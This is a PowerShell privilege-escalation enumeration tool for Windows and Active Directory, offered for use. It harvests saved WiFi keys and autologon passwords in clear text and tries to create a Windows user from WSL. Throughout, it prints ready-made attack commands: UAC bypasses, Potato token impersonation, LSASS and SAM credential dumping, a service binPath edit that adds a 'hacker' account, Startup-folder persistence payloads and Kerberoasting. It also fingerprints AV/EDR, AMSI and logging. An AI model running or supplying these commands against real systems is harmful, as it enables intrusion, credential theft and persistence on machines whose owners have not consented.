# PrivEsc Enumeration - Enhanced PowerShell v3.0
# Comprehensive Windows + AD Privilege Escalation Enumerator
# Now with: Better checks, Browser creds, HTML export, Parallel execution

param(
    [switch]$ExportHTML,
    [switch]$Quick,
    [switch]$SkipBrowsers,
    [string]$OutputFile = "privesc_report.html"
)

$script:Findings = @{
    Critical = @()
    High = @()
    Medium = @()
    Info = @()
}

# ==================== STYLING ====================
$Banner = @"

  ___      _         ___
 | _ \_ __(_)_ _____| __|_ _ _  _ _ __
 |  _/ '_| \ V / -_) _|| ' \ || | '  \
 |_| |_| |_|\_/\___|___|_||_\_,_|_|_|_|
  Windows PrivEsc Enumerator v3.0 Enhanced
  
"@

Write-Host $Banner -ForegroundColor Red
Write-Host "  [*] Starting enumeration..." -ForegroundColor Cyan
Write-Host ""

function Section($t) { Write-Host "`n=== $t ===" -ForegroundColor Cyan }
function Ok($m) { Write-Host "[+] $m" -ForegroundColor Green }
function Fail($m) { Write-Host "[-] $m" -ForegroundColor DarkGray }
function Info($m) { Write-Host "[*] $m" -ForegroundColor Blue; $script:Findings.Info += $m }
function Vuln($m, $sev="High") { 
    Write-Host "[!] $m" -ForegroundColor Yellow -BackgroundColor DarkRed
    if ($sev -eq "Critical") { $script:Findings.Critical += $m }
    elseif ($sev -eq "High") { $script:Findings.High += $m }
    else { $script:Findings.Medium += $m }
}
function Cmd($m) { Write-Host "    -> $m" -ForegroundColor Cyan }
function SubSection($t) { Write-Host "`n  -- $t --" -ForegroundColor White }

# ==================== SYSTEM INFO ====================
Section "SYSTEM INFORMATION"
$os = Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue
$cs = Get-WmiObject Win32_ComputerSystem -EA SilentlyContinue
$script:BuildNum = if ($os) { [int]$os.BuildNumber } else { 0 }

Info "Hostname: $env:COMPUTERNAME"
Info "Username: $env:USERDOMAIN\$env:USERNAME"
Info "Architecture: $env:PROCESSOR_ARCHITECTURE"
if ($os) {
    Info "OS: $($os.Caption) Build $($os.BuildNumber)"
    Info "Install Date: $($os.InstallDate)"
    Info "Last Boot: $($os.LastBootUpTime)"
}

if ($cs.PartOfDomain) {
    Vuln "DOMAIN JOINED: $($cs.Domain)" "Critical"
} else {
    Info "Workgroup: $($cs.Workgroup)"
}

# IP Addresses
$ips = Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | 
    Where-Object {$_.InterfaceAlias -notmatch "Loopback"} | 
    Select-Object -ExpandProperty IPAddress
if ($ips) {
    Info "IP Addresses: $($ips -join ', ')"
}

# ==================== USER CONTEXT ====================
Section "CURRENT USER CONTEXT"

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [Security.Principal.WindowsPrincipal]$identity

Info "User SID: $($identity.User.Value)"
Info "Is Admin: $($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"

$grpOut = whoami /groups 2>$null
if ($grpOut -match "S-1-16-12288") { 
    Vuln "HIGH INTEGRITY - Already elevated!" "Critical"
    Cmd "No UAC bypass needed - already admin"
}
elseif ($grpOut -match "S-1-16-16384") { 
    Vuln "SYSTEM INTEGRITY - Full control!" "Critical"
}
elseif ($grpOut -match "S-1-16-8192") { 
    Info "Medium Integrity (standard user)" 
}

if ($grpOut -match "BUILTIN\\Administrators") {
    Vuln "User is in LOCAL ADMINISTRATORS group!" "Critical"
    Cmd "UAC bypass will get High Integrity without password"
}

# Interesting group memberships
$interestingGroups = @(
    "Backup Operators",
    "Remote Desktop Users",
    "Remote Management Users",
    "Power Users",
    "Hyper-V Administrators",
    "Print Operators",
    "Server Operators",
    "Account Operators",
    "DnsAdmins"
)

SubSection "Group Memberships"
foreach ($group in $interestingGroups) {
    if ($grpOut -match $group) {
        Vuln "$group - Potential privilege escalation path!" "High"
    }
}

# ==================== PRIVILEGES ====================
Section "DANGEROUS PRIVILEGES"

$privOut = whoami /priv 2>$null
$dangerousPrivs = @{
    "SeImpersonatePrivilege" = @{
        "desc" = "Token Impersonation"
        "exploit" = "GodPotato.exe -cmd 'cmd /c whoami > C:\temp\proof.txt'"
        "severity" = "Critical"
    }
    "SeAssignPrimaryTokenPrivilege" = @{
        "desc" = "Assign Primary Token"
        "exploit" = "Similar to SeImpersonate - use Potato exploits"
        "severity" = "Critical"
    }
    "SeDebugPrivilege" = @{
        "desc" = "Debug Programs"
        "exploit" = "procdump -ma lsass.exe lsass.dmp"
        "severity" = "Critical"
    }
    "SeBackupPrivilege" = @{
        "desc" = "Backup files and directories"
        "exploit" = "reg save HKLM\SAM sam.hiv && reg save HKLM\SYSTEM system.hiv"
        "severity" = "High"
    }
    "SeRestorePrivilege" = @{
        "desc" = "Restore files and directories"
        "exploit" = "Write to any file, modify system files"
        "severity" = "High"
    }
    "SeTakeOwnershipPrivilege" = @{
        "desc" = "Take ownership of files"
        "exploit" = "takeown /f C:\Windows\System32\file.dll"
        "severity" = "High"
    }
    "SeLoadDriverPrivilege" = @{
        "desc" = "Load kernel drivers"
        "exploit" = "Load vulnerable driver (Capcom.sys)"
        "severity" = "Critical"
    }
    "SeTcbPrivilege" = @{
        "desc" = "Act as part of OS"
        "exploit" = "Direct SYSTEM access"
        "severity" = "Critical"
    }
}

$foundPrivs = $false
foreach ($priv in $dangerousPrivs.Keys) {
    if ($privOut -match $priv) {
        $foundPrivs = $true
        Vuln "$priv ENABLED - $($dangerousPrivs[$priv].desc)" $dangerousPrivs[$priv].severity
        Cmd $dangerousPrivs[$priv].exploit
    }
}

if (-not $foundPrivs) {
    Fail "No dangerous privileges found"
}

# ==================== UAC CONFIGURATION ====================
Section "UAC STATUS & BYPASS METHODS"

$uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -EA SilentlyContinue
if ($uac) {
    Info "EnableLUA: $($uac.EnableLUA)"
    Info "ConsentPromptBehaviorAdmin: $($uac.ConsentPromptBehaviorAdmin) (0=Never, 5=Always)"
    Info "PromptOnSecureDesktop: $($uac.PromptOnSecureDesktop)"
    Info "FilterAdministratorToken: $($uac.FilterAdministratorToken)"
    
    if ($uac.EnableLUA -eq 0) {
        Vuln "UAC COMPLETELY DISABLED! No bypass needed." "Critical"
    } elseif ($uac.ConsentPromptBehaviorAdmin -eq 0) {
        Vuln "UAC set to NEVER NOTIFY - auto-elevate without prompt!" "Critical"
    } elseif ($uac.ConsentPromptBehaviorAdmin -le 2) {
        Vuln "UAC BYPASSABLE - Weak configuration!" "High"
    }
}

# Only show UAC bypasses if not already elevated
$integrityCheck = whoami /groups 2>$null
if (-not ($integrityCheck -match "S-1-16-12288|S-1-16-16384")) {
    
    SubSection "Registry Hijack UAC Bypasses"
    
    # fodhelper.exe
    if ((Test-Path "C:\Windows\System32\fodhelper.exe") -and ($BuildNum -ge 10240)) {
        $patched = $BuildNum -ge 26100
        if ($patched) {
            Fail "fodhelper.exe: Likely patched in Build $BuildNum"
        } else {
            Vuln "fodhelper.exe: AVAILABLE (Win10+ Build $BuildNum)" "High"
            Cmd "reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d 'cmd' /f"
            Cmd "reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f"
            Cmd "fodhelper.exe"
        }
    }
    
    # wsreset.exe
    if ((Test-Path "C:\Windows\System32\wsreset.exe") -and ($BuildNum -ge 17134)) {
        $patched = $BuildNum -ge 26100
        if ($patched) {
            Fail "wsreset.exe: Likely patched in Build $BuildNum"
        } else {
            Vuln "wsreset.exe: AVAILABLE (Win10 1803+)" "High"
            Cmd "reg add HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber24ueqv6he9fj\Shell\open\command /ve /d cmd.exe /f"
        }
    }
    
    # eventvwr.exe
    if ((Test-Path "C:\Windows\System32\eventvwr.exe") -and ($BuildNum -lt 15031)) {
        Vuln "eventvwr.exe: AVAILABLE (unpatched!)" "High"
        Cmd "reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d cmd.exe /f"
        Cmd "eventvwr.exe"
    }
    
    # sdclt.exe
    if ((Test-Path "C:\Windows\System32\sdclt.exe") -and ($BuildNum -ge 10240) -and ($BuildNum -lt 17025)) {
        Vuln "sdclt.exe: AVAILABLE (unpatched!)" "High"
        Cmd "reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe' /ve /d cmd.exe /f"
        Cmd "sdclt.exe /kickoffelev"
    }
    
    SubSection "Scheduled Task UAC Bypasses"
    
    # SilentCleanup
    $silentTask = Get-ScheduledTask -TaskName "SilentCleanup" -EA SilentlyContinue
    if ($silentTask) {
        Vuln "SilentCleanup Task: AVAILABLE (Environment variable hijack)" "High"
        Cmd "reg add HKCU\Environment /v windir /d 'cmd /c start cmd &&'"
        Cmd "schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
    }
    
    SubSection "DLL Hijacking Opportunities"
    
    $dllHijackTargets = @(
        @{Path="C:\Windows\System32\Sysprep\sysprep.exe"; DLL="cryptbase.dll, shcore.dll"}
        @{Path="C:\Windows\System32\migwiz\migwiz.exe"; DLL="cryptbase.dll"}
    )
    
    foreach ($target in $dllHijackTargets) {
        if (Test-Path $target.Path) {
            Ok "$($target.Path): DLL hijack possible ($($target.DLL))"
        }
    }
}

# ==================== SECURITY SOFTWARE ====================
Section "SECURITY SOFTWARE & EDR"

SubSection "Windows Defender"
try {
    $mp = Get-MpComputerStatus -EA Stop
    
    if ($mp.RealTimeProtectionEnabled) {
        Fail "Defender Real-time Protection: ENABLED"
    } else {
        Vuln "Defender Real-time Protection: DISABLED!" "High"
    }
    
    if ($mp.TamperProtectionEnabled) {
        Fail "Tamper Protection: ENABLED (cannot disable Defender)"
    } else {
        Vuln "Tamper Protection: DISABLED (can disable Defender!)" "Medium"
    }
    
    # Check exclusions (requires admin)
    try {
        $mpPref = Get-MpPreference -EA Stop
        if ($mpPref.ExclusionPath) {
            Vuln "Defender Path Exclusions found:" "Medium"
            $mpPref.ExclusionPath | ForEach-Object { Cmd $_ }
        }
    } catch {
        Info "Cannot read Defender exclusions (requires admin)"
    }
    
} catch {
    Info "Windows Defender status unavailable"
}

SubSection "AMSI & Script Block Logging"
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($amsi) {
        Fail "AMSI: Loaded and active"
    }
} catch {
    Ok "AMSI: Not loaded or bypassable"
}

# Script block logging
$scriptBlockLog = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -EA SilentlyContinue
if ($scriptBlockLog -and $scriptBlockLog.EnableScriptBlockLogging -eq 1) {
    Fail "PowerShell Script Block Logging: ENABLED"
} else {
    Ok "PowerShell Script Block Logging: DISABLED"
}

SubSection "AppLocker & WDAC"
$appLockerPolicy = Get-AppLockerPolicy -Effective -EA SilentlyContinue
if ($appLockerPolicy) {
    Fail "AppLocker: CONFIGURED (may block execution)"
    
    # Check for weak rules
    $rules = $appLockerPolicy.RuleCollections
    foreach ($collection in $rules) {
        if ($collection.PathConditions -match "\*") {
            Vuln "AppLocker weak rule found in $($collection.RuleCollectionType)" "Medium"
        }
    }
} else {
    Ok "AppLocker: NOT CONFIGURED"
}

SubSection "Third-Party AV/EDR"
$suspiciousProcesses = @(
    "MsMpEng", "NisSrv",           # Defender
    "cb", "carbonblack",           # Carbon Black
    "cylance",                      # Cylance
    "CrowdStrike", "csagent",      # CrowdStrike
    "tanium",                       # Tanium
    "SentinelAgent", "sentinel",   # SentinelOne
    "elastic-agent", "winlogbeat"  # Elastic
)

$runningAV = Get-Process | Where-Object { 
    $proc = $_.ProcessName
    $suspiciousProcesses | Where-Object { $proc -match $_ }
} | Select-Object -ExpandProperty ProcessName -Unique

if ($runningAV) {
    Fail "Detected AV/EDR processes:"
    $runningAV | ForEach-Object { Info "  -> $_ " }
} else {
    Ok "No obvious AV/EDR detected"
}

# ==================== NETWORK INFORMATION ====================
Section "NETWORK CONFIGURATION"

SubSection "Network Adapters"
Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | 
    Where-Object {$_.InterfaceAlias -notmatch "Loopback"} | 
    Select-Object -First 10 | ForEach-Object {
    Info "$($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)"
}

SubSection "Listening Ports"
$listeners = Get-NetTCPConnection -State Listen -EA SilentlyContinue | 
    Select-Object LocalPort, @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).ProcessName}} -Unique |
    Sort-Object LocalPort | Select-Object -First 20

foreach ($l in $listeners) {
    $severity = if ($l.LocalPort -in @(445, 3389, 5985, 5986)) { "High" } else { "Info" }
    if ($severity -eq "High") {
        Vuln "Port $($l.LocalPort) - $($l.Process) (HIGH VALUE)" "Medium"
    } else {
        Ok "Port $($l.LocalPort) - $($l.Process)"
    }
}

SubSection "ARP Cache (Potential Targets)"
$arp = Get-NetNeighbor -State Reachable,Permanent -EA SilentlyContinue | 
    Where-Object {$_.IPAddress -notmatch "^(224|239|255|ff)"} |
    Select-Object -First 10

$arp | ForEach-Object {
    Info "$($_.IPAddress) -> $($_.LinkLayerAddress)"
}

# ==================== CREDENTIAL HUNTING ====================
Section "CREDENTIAL HUNTING"

SubSection "Stored Credentials (cmdkey)"
$stored = cmdkey /list 2>$null | Select-String "Target:"
if ($stored) {
    foreach ($cred in $stored) {
        Vuln $cred.ToString().Trim() "High"
    }
    Cmd "runas /savecred /user:DOMAIN\user cmd.exe"
} else {
    Fail "No stored credentials found"
}

SubSection "Windows Vault"
try {
    $vault = vaultcmd /list 2>$null
    if ($vault -match "Credential") {
        Vuln "Windows Vault contains credentials!" "High"
        Cmd "vaultcmd /listcreds:'Windows Credentials' /all"
    }
} catch {}

if (-not $SkipBrowsers) {
    SubSection "Browser Saved Passwords"
    
    # Edge
    $edgeLogin = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgeLogin) {
        Vuln "Edge Login Data exists - extract with Python script!" "High"
        Cmd "python extract_edge_passwords.py"
    }
    
    # Chrome
    $chromeProfiles = Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory -EA SilentlyContinue |
        Where-Object {$_.Name -match "^(Default|Profile)"}
    
    if ($chromeProfiles) {
        foreach ($profile in $chromeProfiles) {
            $loginData = Join-Path $profile.FullName "Login Data"
            if (Test-Path $loginData) {
                Vuln "Chrome $($profile.Name) has saved passwords!" "High"
            }
        }
        Cmd "python extract_chrome_passwords.py"
    }
    
    # Firefox
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -EA SilentlyContinue
    if ($firefoxProfiles) {
        $firefoxProfiles | ForEach-Object {
            $logins = Join-Path $_.FullName "logins.json"
            if (Test-Path $logins) {
                Vuln "Firefox profile $($_.Name) has saved passwords!" "High"
                Cmd "python firefox_decrypt.py '$($_.FullName)'"
            }
        }
    }
}

SubSection "WiFi Passwords"
$wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile"
if ($wifiProfiles) {
    foreach ($profile in $wifiProfiles) {
        $ssid = $profile.ToString().Split(":")[1].Trim()
        $key = netsh wlan show profile name="$ssid" key=clear 2>$null | Select-String "Key Content"
        if ($key) {
            $password = $key.ToString().Split(":")[1].Trim()
            Vuln "WiFi: $ssid -> $password" "Medium"
        }
    }
}

SubSection "Unattend.xml Files (Admin Passwords)"
$unattendPaths = @(
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\System32\Sysprep\Unattend.xml",
    "C:\Windows\System32\Sysprep\Panther\Unattend.xml"
)

foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Vuln "Unattend.xml found: $path (May contain admin passwords!)" "Critical"
        Cmd "type '$path' | Select-String -Pattern 'Password'"
    }
}

SubSection "Registry Autologon"
$autologon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -EA SilentlyContinue
if ($autologon.AutoAdminLogon -eq "1") {
    Vuln "AutoLogon ENABLED!" "High"
    if ($autologon.DefaultUserName) { Info "  Username: $($autologon.DefaultUserName)" }
    if ($autologon.DefaultPassword) { Vuln "  Password: $($autologon.DefaultPassword)" "Critical" }
}

# ==================== FILE SYSTEM ====================
Section "WRITABLE LOCATIONS"

SubSection "Writable System Directories"
$systemDirs = @(
    "C:\Windows\Temp",
    "C:\Windows\Tasks",
    "C:\Windows\System32\Tasks",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\tracing"
)

foreach ($dir in $systemDirs) {
    if (Test-Path $dir) {
        try {
            $testFile = Join-Path $dir "test_$(Get-Random).txt"
            "test" | Out-File $testFile -EA Stop
            Remove-Item $testFile -EA SilentlyContinue
            Vuln "WRITABLE: $dir" "Medium"
        } catch {}
    }
}

SubSection "Interesting Files"
$interestingExtensions = @("*.config", "*.ini", "*.xml", "*.txt", "*.log")
$interestingPaths = @("C:\inetpub", "C:\xampp", "C:\Program Files")

foreach ($path in $interestingPaths) {
    if (Test-Path $path) {
        foreach ($ext in $interestingExtensions | Select-Object -First 2) {
            $files = Get-ChildItem -Path $path -Filter $ext -Recurse -EA SilentlyContinue -Depth 2 |
                Where-Object {$_.Name -match "password|config|connection|secret"} |
                Select-Object -First 3
            
            $files | ForEach-Object {
                Ok "Found: $($_.FullName)"
            }
        }
    }
}

# ==================== SERVICES ====================
Section "SERVICE ENUMERATION"

SubSection "Unquoted Service Paths"
$unquoted = Get-WmiObject Win32_Service -EA SilentlyContinue | Where-Object {
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match ' ' -and 
    $_.PathName -notmatch 'system32'
} | Select-Object -First 10

if ($unquoted) {
    foreach ($svc in $unquoted) {
        Vuln "UNQUOTED PATH: $($svc.Name)" "High"
        Cmd "$($svc.PathName)"
        
        # Check if we can write to parent directory
        $pathParts = $svc.PathName -split ' '
        $exePath = $pathParts[0]
        $parentDir = Split-Path $exePath -Parent
        
        if (Test-Path $parentDir) {
            try {
                $testFile = Join-Path $parentDir "test.tmp"
                "test" | Out-File $testFile -EA Stop
                Remove-Item $testFile -EA SilentlyContinue
                Vuln "  -> Parent directory is WRITABLE!" "Critical"
            } catch {}
        }
    }
} else {
    Fail "No unquoted service paths found"
}

SubSection "Modifiable Service Binaries"
$services = Get-WmiObject Win32_Service -EA SilentlyContinue | 
    Where-Object {$_.PathName -notmatch "system32"} |
    Select-Object -First 20

foreach ($svc in $services) {
    $exePath = $svc.PathName -replace '"', '' -split ' ' | Select-Object -First 1
    
    if (Test-Path $exePath) {
        try {
            $acl = Get-Acl $exePath -EA Stop
            $writePerms = $acl.Access | Where-Object {
                ($_.FileSystemRights -match "Write|FullControl|Modify") -and
                ($_.IdentityReference -match "Users|Everyone|Authenticated")
            }
            
            if ($writePerms) {
                Vuln "WRITABLE SERVICE BINARY: $($svc.Name)" "Critical"
                Cmd "$exePath"
                Cmd "sc config $($svc.Name) binPath= 'cmd.exe /c net user hacker pass /add'"
            }
        } catch {}
    }
}

SubSection "Services Running as SYSTEM"
Get-WmiObject Win32_Service -EA SilentlyContinue | 
    Where-Object {$_.StartName -eq "LocalSystem" -and $_.State -eq "Running"} |
    Select-Object -First 10 | ForEach-Object {
    Info "$($_.Name) - $($_.PathName)"
}

# ==================== SCHEDULED TASKS ====================
if (-not $Quick) {
    Section "SCHEDULED TASKS"
    
    SubSection "High-Privilege Tasks"
    $tasks = Get-ScheduledTask -EA SilentlyContinue | Where-Object {
        $_.Principal.UserId -match "SYSTEM|Administrators"
    } | Select-Object -First 10
    
    foreach ($task in $tasks) {
        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -EA SilentlyContinue
        $action = $task.Actions | Select-Object -First 1
        
        if ($action.Execute) {
            Info "$($task.TaskName)"
            Cmd "$($action.Execute) $($action.Arguments)"
            
            # Check if executable is writable
            $exePath = $action.Execute
            if (Test-Path $exePath) {
                try {
                    $acl = Get-Acl $exePath -EA Stop
                    $writePerms = $acl.Access | Where-Object {
                        ($_.FileSystemRights -match "Write|FullControl") -and
                        ($_.IdentityReference -match "Users|Everyone")
                    }
                    if ($writePerms) {
                        Vuln "Task executable is WRITABLE!" "Critical"
                    }
                } catch {}
            }
        }
    }
}

# ==================== WSL PRIVILEGE ESCALATION ====================
Section "WSL (WINDOWS SUBSYSTEM FOR LINUX)"

$wslAvailable = $false
try {
    $wslCheck = wsl --list 2>$null
    if ($wslCheck) {
        $wslAvailable = $true
    }
} catch {
    $wslAvailable = $false
}

if ($wslAvailable) {
    Vuln "WSL IS INSTALLED AND ACCESSIBLE!" "Critical"
    
    # Check WSL version and distros
    SubSection "WSL Configuration"
    
    try {
        $wslDistros = wsl --list --verbose 2>$null
        if ($wslDistros) {
            $wslDistros | ForEach-Object {
                if ($_ -and $_ -notmatch "NAME|Windows|---") {
                    Info $_.Trim()
                }
            }
        }
    } catch {}
    
    # Check WSL user
    $wslUser = wsl whoami 2>$null
    if ($wslUser) {
        if ($wslUser -match "root") {
            Vuln "WSL USER IS ROOT - Full Windows filesystem access!" "Critical"
        } else {
            Info "WSL User: $wslUser"
        }
    }
    
    # Check Windows filesystem mount
    SubSection "Windows Filesystem Access"
    
    $canAccessWindows = wsl test -d /mnt/host/c/Windows '&&' echo "ACCESSIBLE" 2>$null
    if ($canAccessWindows -match "ACCESSIBLE") {
        Vuln "WSL can access C:\Windows\ via /mnt/host/c/" "Critical"
        Cmd "wsl ls -la /mnt/host/c/Windows/"
    }
    
    # Test actual privilege escalation capability
    SubSection "Privilege Escalation Tests"
    
    Write-Host "  [*] Testing if WSL can create Windows users..." -ForegroundColor Yellow
    
    # Create test script in WSL
    $testScript = @'
#!/bin/bash
# Test user creation from WSL
powershell.exe -WindowStyle Hidden -Command "try { \$c=[ADSI]'WinNT://.'; \$u=\$c.Create('user','wsltest'); \$u.SetPassword('Test123!'); \$u.SetInfo(); echo 'SUCCESS' } catch { echo \"FAILED: \$(\$_.Exception.Message)\" }" 2>&1
'@
    
    $testResult = wsl bash -c "$testScript" 2>$null
    
    if ($testResult -match "SUCCESS") {
        Vuln "WSL CAN CREATE WINDOWS USERS!" "Critical"
        Cmd "Full privilege escalation possible via WSL"
        
        # Clean up test user
        try {
            net user wsltest /delete 2>$null | Out-Null
        } catch {}
        
    } elseif ($testResult -match "Access is denied") {
        Fail "Cannot create users from WSL (requires admin privileges)"
        Info "Even as WSL root, Windows user creation requires admin rights"
    } else {
        Info "User creation test result: $testResult"
    }
    
    # Check writable locations from WSL
    SubSection "Writable Windows Paths (from WSL as root)"
    
    $wslTestPaths = @(
        @{Path="/mnt/host/c/Windows/Temp"; Name="Windows Temp"; Severity="Medium"},
        @{Path="/mnt/host/c/Windows/Tasks"; Name="Windows Tasks"; Severity="High"},
        @{Path="/mnt/host/c/Windows/System32/Tasks"; Name="Scheduled Tasks Directory"; Severity="High"},
        @{Path="/mnt/host/c/Windows/System32/Sysprep"; Name="Sysprep (DLL Hijack)"; Severity="Critical"},
        @{Path="/mnt/host/c/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Name="Startup Folder"; Severity="Critical"}
    )
    
    foreach ($testPath in $wslTestPaths) {
        $testFile = "test_wsl_$(Get-Random).tmp"
        $writeTest = wsl bash -c "touch '$($testPath.Path)/$testFile' 2>&1 && rm '$($testPath.Path)/$testFile' 2>&1 && echo WRITABLE || echo BLOCKED" 2>$null
        
        if ($writeTest -match "WRITABLE") {
            Vuln "$($testPath.Name): WRITABLE from WSL!" $testPath.Severity
            
            if ($testPath.Name -match "Startup") {
                Cmd "echo 'cmd /c whoami > C:\temp\proof.txt' > '$($testPath.Path)/exploit.bat'"
            } elseif ($testPath.Name -match "Sysprep") {
                Cmd "Compile malicious DLL and copy: cp evil.dll '$($testPath.Path)/cryptbase.dll'"
            } elseif ($testPath.Name -match "Tasks") {
                Cmd "Modify scheduled task XML files to execute commands as SYSTEM"
            }
        } else {
            Fail "$($testPath.Name): Not writable from WSL"
        }
    }
    
    # Check for compilers
    SubSection "Development Tools in WSL"
    
    $gcc = wsl which gcc 2>$null
    if ($gcc) {
        Ok "GCC compiler available: $gcc"
    }
    
    $mingw = wsl which x86_64-w64-mingw32-gcc 2>$null
    if ($mingw) {
        Vuln "MinGW-w64 available - Can compile Windows exploits!" "Medium"
        Cmd "wsl x86_64-w64-mingw32-gcc exploit.c -o exploit.exe"
        Cmd "Install: wsl sudo apt install mingw-w64"
    } else {
        Info "MinGW not installed (can compile Windows binaries)"
        Cmd "Install with: wsl sudo apt install mingw-w64 -y"
    }
    
    $python = wsl which python3 2>$null
    if ($python) {
        Ok "Python3 available: $python"
    }
    
    # Check WSL interop
    SubSection "WSL-Windows Interoperability"
    
    $interopTest = wsl cmd.exe /c echo "TEST" 2>$null
    if ($interopTest -match "TEST") {
        Vuln "WSL Interop ENABLED - Can execute Windows binaries from WSL!" "High"
        Cmd "wsl cmd.exe /c 'net user'"
        Cmd "wsl powershell.exe -Command 'Get-Process'"
    } else {
        Info "WSL interop not enabled or not functional"
    }
    
    # Check systemd
    $systemdCheck = wsl systemctl --version 2>$null
    if ($systemdCheck) {
        Ok "Systemd available in WSL (persistence via services)"
        Cmd "wsl sudo systemctl enable malicious.service"
    }
    
    # WSL-specific attack vectors
    SubSection "WSL Attack Vectors Summary"
    
    Info "Potential WSL-based attacks:"
    Cmd "1. Startup folder persistence (batch/VBS files)"
    Cmd "2. Scheduled task modification (if writable)"
    Cmd "3. DLL hijacking (if Sysprep writable)"
    Cmd "4. Compile Windows exploits in WSL"
    Cmd "5. Execute Windows commands via interop"
    Cmd "6. Read Windows files (credentials, configs)"
    
    # Sample exploitation commands
    SubSection "WSL Exploitation Examples"
    
    Cmd "# Startup folder persistence:"
    Cmd "wsl cat > '/mnt/host/c/Users/\$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/payload.bat' << 'EOF'"
    Cmd "@echo off"
    Cmd "powershell -Command 'net user hacker Pass123! /add'"
    Cmd "del %~f0"
    Cmd "EOF"
    Cmd ""
    Cmd "# Compile Windows exploit:"
    Cmd "wsl sudo apt install mingw-w64 -y"
    Cmd "wsl x86_64-w64-mingw32-gcc exploit.c -o exploit.exe"
    Cmd "wsl cp exploit.exe /mnt/host/c/Windows/Temp/"
    Cmd ""
    Cmd "# Read sensitive files:"
    Cmd "wsl cat /mnt/host/c/Windows/System32/config/SAM  # (locked while Windows running)"
    Cmd "wsl grep -r 'password' /mnt/host/c/Users/$env:USERNAME/Documents/"
    
} else {
    Fail "WSL not installed or not accessible"
    Info "Install with: wsl --install"
}

# ==================== DOMAIN ENUMERATION ====================
if ($cs.PartOfDomain -and -not $Quick) {
    Section "ACTIVE DIRECTORY ENUMERATION"
    
    Info "Domain: $($cs.Domain)"
    Info "Logon Server: $($env:LOGONSERVER -replace '\\\\','')"
    
    SubSection "Domain Controllers"
    try {
        $dcs = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
        $dcs | ForEach-Object { Ok $_.Name }
    } catch {
        $dc = nltest /dclist:$($cs.Domain) 2>$null
        if ($dc) { $dc | ForEach-Object { Ok $_ } }
    }
    
    SubSection "Domain Admins"
    net group "Domain Admins" /domain 2>$null | 
        Select-String -NotMatch "^The|^Group|^Comment|^Members|^-|^\s*$" | 
        ForEach-Object { 
            $member = $_.ToString().Trim()
            if ($member) { Vuln "Domain Admin: $member" "Critical" }
        }
    
    SubSection "LDAP Query - Computers"
    try {
        $searcher = [adsisearcher]"(objectClass=computer)"
        $searcher.PageSize = 1000
        $computers = $searcher.FindAll()
        Info "Total Domain Computers: $($computers.Count)"
        
        # Unconstrained delegation
        $searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
        $unconstrained = $searcher.FindAll()
        if ($unconstrained.Count -gt 0) {
            Vuln "Computers with UNCONSTRAINED DELEGATION:" "Critical"
            $unconstrained | ForEach-Object { Cmd $_.Properties["cn"][0] }
        }
        
    } catch {
        Fail "LDAP enumeration failed (may not have permissions)"
    }
    
    SubSection "Kerberoastable SPNs"
    $spns = setspn -Q */* 2>$null | Select-String "CN=" | Select-Object -First 15
    if ($spns) {
        foreach ($spn in $spns) {
            $line = $spn.ToString().Trim()
            if ($line -match "admin|sql|svc|service|krbtgt" -and $line -notmatch "krbtgt") {
                Vuln $line "High"
            } else {
                Ok $line
            }
        }
        Cmd "GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request"
    }
}

# ==================== SUMMARY & QUICK WINS ====================
Section "EXPLOITATION QUICK WINS"

SubSection "1. UAC Bypass (If Local Admin)"
Cmd "# Fodhelper method:"
Cmd "reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d 'cmd /c start cmd' /f"
Cmd "reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f"
Cmd "fodhelper.exe"
Cmd ""
Cmd "# SilentCleanup method:"
Cmd "reg add HKCU\Environment /v windir /d 'cmd /c whoami > C:\temp\proof.txt &&' /f"
Cmd "schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"

SubSection "2. Token Impersonation (If SeImpersonatePrivilege)"
Cmd "# GodPotato (2022+):"
Cmd ".\GodPotato.exe -cmd 'cmd /c whoami'"
Cmd "# PrintSpoofer:"
Cmd ".\PrintSpoofer.exe -i -c cmd"

SubSection "3. Credential Extraction"
Cmd "# Browser passwords:"
Cmd "python universal_password_extractor.py"
Cmd ""
Cmd "# LSASS dump (requires admin):"
Cmd "procdump -ma lsass.exe lsass.dmp"
Cmd "rundll32 comsvcs.dll MiniDump <lsass_PID> lsass.dmp full"
